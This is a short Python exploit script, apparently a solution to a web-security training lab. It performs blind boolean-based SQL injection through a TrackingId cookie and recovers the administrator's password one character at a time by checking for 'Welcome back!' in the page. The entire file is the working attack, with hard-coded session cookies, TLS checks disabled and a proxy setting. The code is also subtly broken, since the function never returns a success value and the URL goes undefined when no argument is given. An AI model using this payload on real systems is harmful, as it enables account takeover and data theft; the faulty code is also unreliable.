import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.2:8080'}


def exploit_payload(url):
    password = ""
    for i in range(1, 21):
        for j in range(32, 127):
            payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')={j}--"
            sql_payload = urllib.parse.quote_plus(payload)
            cookies = {'TrackingId': 'c1pj6tf7Y5utwRtw'+sql_payload,
                       'session': 'UMX1d7KdXe7EeSIlU744znYcVTqOvCYE'}
            #  change tracking id and session id accordingly
            r = requests.get(url, cookies=cookies,
                             verify=False, proxies=proxies)
            if "Welcome back!" in r.text:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()


if __name__ == "__main__":

    try:
        url = sys.argv[1].strip()
    except:
        print(f'[*] Usage: python {sys.argv[0]} <url>')
        print(f'[*] Example: python {sys.argv[0]} http://www.example.com')
    if exploit_payload(url):
        print('\n[+] Exploit Successful!')
    else:
        print('\n[-] Exploit Failed!')
